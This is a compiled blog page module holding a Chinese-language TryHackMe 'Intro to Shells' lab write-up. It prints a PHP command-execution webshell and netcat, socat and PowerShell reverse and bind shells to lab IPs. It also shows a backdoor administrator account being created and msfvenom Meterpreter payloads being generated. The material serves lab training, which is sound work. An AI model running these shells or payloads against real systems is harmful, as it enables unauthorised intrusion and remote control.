import{_ as i,c as s,d as l,o as t}from"./app-CoLZFvGU.js";const a={};function n(h,e){return t(),s("div",null,e[0]||(e[0]=[l(`<h3 id="webshell" tabindex="-1"><a class="header-anchor" href="#webshell"><span>webshell</span></a></h3><h4 id="本文相关的tryhackme实验房间链接-https-tryhackme-com-room-introtoshells" tabindex="-1"><a class="header-anchor" href="#本文相关的tryhackme实验房间链接-https-tryhackme-com-room-introtoshells"><span>本文相关的TryHackMe实验房间链接：https://tryhackme.com/room/introtoshells</span></a></h4><ol><li>尝试将 Webshel​​l 上传到Linux机器，然后使用以下命令：<code>nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash</code>将反向 shell 发送回您自己计算机上等待的侦听器。</li></ol><ul><li><code>nc -nlvp 1234</code></li><li>创建php文件 webshell.php<div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-php"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">php</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">  if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">isset</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$_GET</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;cmd&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]))</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  {</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">      system</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$_GET</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;cmd&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">  ?</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li>打开被攻击的网址<code>http://10.10.57.248/</code>,上传webshell.php</li><li>构建url <code>http://10.10.57.248/uploads/webshell.php?cmd=nc 10.10.21.196 1234 -e /bin/bash</code>,后面的参数ip为你本地的ip端口为你nc监听的端口(简单说这一步就是访问你刚才上传的文件并传入命令执行)。</li><li>然后查看nc 看到连接成功</li></ul><ol start="2"><li>导航到/usr/share/webshells/php/php-reverse-shell.phpKali 并更改 IP 和端口，以将您的 tun0 IP 与自定义端口相匹配。设置 netcat 监听器，然后上传并激活 shell。</li></ol><ul><li>连接ssh <code>ssh shell@10.10.149.6</code></li><li>执行 <code>mkfifo /tmp/f; nc -lvnp 4444 &lt; /tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f</code></li><li>执行 <code>nc 10.10.149.6 4444</code> 此处的ip是目标机的ip</li><li>成功</li></ul><ol start="3"><li>在 Windows 目标上上传 Webshel​​l 并尝试使用 Powershell 获取反向 shell。</li></ol><ul><li><code>nc -nlvp 1234</code></li><li>创建php文件 webshell.php<div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-php"><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">php</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">  if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">isset</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$_GET</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;cmd&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]))</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  {</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">      system</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$_GET</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;cmd&#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">  }</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">  ?</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li>打开被攻击的网址<code>http://10.10.57.248/</code>,上传webshell.php</li><li>构建url <code>http://10.10.57.248/uploads/webshell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.194.117%27%2C1234%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22</code>,后面的参数ip为你本地的ip端口为你nc监听的端口(简单说这一步就是访问你刚才上传的文件并传入命令执行)。</li><li>然后查看nc 看到连接成功</li></ul><ol start="4"><li>网络服务器正在以系统权限运行。创建一个新用户并将其添加到“管理员”组，然后通过 RDP 或 WinRM 登录。</li></ol><ul><li>使用刚才获取的shell</li><li><code>net user test test123 /add</code> #添加新用户 <code>net localgroup administrators test /add</code> #添加用户到管理员组</li><li>使用新用户登录 <code>xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.91.116 /u:test /p:&#39;test123&#39;</code></li></ul><ol start="5"><li>要求：尝试使用 socat 和 netcat 在 Windows 目标上获得反向和绑定 shell。 netcat反向shell <ul><li>目标机ip：10.10.234.86 攻击机ip：10.10.249.251</li><li>Netcat反向shell, 在攻击者终端:<code>nc -lvnp 12345</code></li><li>然后使用 RDP 登录到目标的管理员账户,使用攻击机终端 通过RDP登录到目标系统的管理员账户 <code>xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.10.234.86 /u:Administrator /p:&#39;TryH4ckM3!&#39;</code></li><li>在 cmd 上输入以下内容:nc 10.10.249.251 12345 -e&quot;cmd.exe&quot;</li><li>返回刚才创建的shell查看，成功建立netcat反向shell</li></ul></li></ol><p>netcat绑定shell</p><ul><li>现在正好相反，在目标机的cmd上启动一个 netcat 监听器: <code>nc -lvnp 12345 -e &quot;cmd.exe&quot; # -e和&quot;cmd.exe&quot;之间有空格和没有空格 执行结果一样</code></li><li>在攻击者的电脑上运行以下命令: <code>nc 10.10.234.86 12345</code></li><li>成功绑定shell</li></ul><p>Socat绑定shell</p><ul><li>在目标机器的 cmd 上启动一个监听器（注意：socat监听器在执行监听时没有提示语）:<br><code>socat TCP-L:12345 EXEC:powershell.exe,pipes</code></li><li>然后在攻击者的电脑上<br><code>socat TCP:10.10.234.86:12345 -</code></li><li>成功绑定shell</li></ul><p>Socat反向shell</p><ul><li>在攻击者的终端上设置socat监听器（注意：socat监听器在执行监听时没有提示语）:<br><code>socat TCP-L:12345 -</code></li><li>然后在目标机器的 cmd 中运行以下命令 <code>socat TCP:10.10.249.251:12345 EXEC:powershell.exe,pipes</code></li><li>成功建立Socat反向shell</li></ul><ol start="6"><li>使用 msfvenom 创建 64 位 Windows Meterpreter shell 并将其上传到 Windows Target。激活 shell 并使用 multi/handler 捕获它。尝试一下这个 shell 的功能。</li></ol><ul><li>目标机ip：10.10.245.66<br> 攻击机ip：10.10.244.218</li><li>使用 msfvenom创建payload(包括 shell)的语法如下:<br><code>msfvenom -p &lt;PAYLOAD&gt; &lt;OPTIONS&gt;</code><br> 在攻击机上运行(会生成一个shell.exe)： <code>msfvenom -p windows/x64/meterpreter/reverse_tcp -f exe -o shell.exe LHOST=10.10.244.218 LPORT=12345</code></li><li>在攻击机上执行以下操作来设置 multi/handler:</li></ul><ol><li>使用 <code>msfconsole</code> 命令打开 Metasploit</li><li>输入命令: <code>use multi/handler</code></li><li>输入 <code>show options</code> 命令来查看不同的选项</li><li>设置PAYLOAD参数 (<code>set payload windows/x64/meterpreter/reverse_tcp</code>), LHOST参数 (攻击机ip)(<code>set LHOST 10.10.244.218</code>) 以及LPORT参数(<code>set LPORT 12345</code>)</li></ol><ul><li>在目标机器上调用shell.exe文件</li><li>在攻击机界面获得一个Meterpreter shell</li></ul><ol start="7"><li>为任一目标创建分阶段和无阶段的 meterpreter shell。上传并手动激活它们，用netcat捕获 shell——这有效吗？<br> 不能，我们需要使用msf里面的multi/handler模块捕获meterpreter shell，用netcat并不能使这个shell正常工作。</li></ol><p>参考文章：<a href="https://www.cnblogs.com/Hekeats-L/p/16769018.html" target="_blank" rel="noopener noreferrer">【THM】What the shell？-学习(下)</a></p>`,23)]))}const r=i(a,[["render",n]]),c=JSON.parse('{"path":"/cyberSecurity/webShell.html","title":"","lang":"zh-CN","frontmatter":{"description":"webshell 本文相关的TryHackMe实验房间链接：https://tryhackme.com/room/introtoshells 尝试将 Webshel​​l 上传到Linux机器，然后使用以下命令：nc <LOCAL-IP> <PORT> -e /bin/bash将反向 shell 发送回您自己计算机上等待的侦听器。 nc -nlvp 1...","head":[["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2024-01-18T06:47:49.000Z\\",\\"author\\":[]}"],["meta",{"property":"og:url","content":"https://github.com/Justice996/cyberSecurity/webShell.html"}],["meta",{"property":"og:site_name","content":"Justice的博客"}],["meta",{"property":"og:description","content":"webshell 本文相关的TryHackMe实验房间链接：https://tryhackme.com/room/introtoshells 尝试将 Webshel​​l 上传到Linux机器，然后使用以下命令：nc <LOCAL-IP> <PORT> -e /bin/bash将反向 shell 发送回您自己计算机上等待的侦听器。 nc -nlvp 1..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2024-01-18T06:47:49.000Z"}],["meta",{"property":"article:modified_time","content":"2024-01-18T06:47:49.000Z"}]]},"git":{"createdTime":1705390375000,"updatedTime":1705560469000,"contributors":[{"name":"justice","username":"justice","email":"1393080039@qq.com","commits":7,"url":"https://github.com/justice"}]},"readingTime":{"minutes":4.01,"words":1203},"filePathRelative":"cyberSecurity/webShell.md","excerpt":"","autoDesc":true}');export{r as comp,c as data};
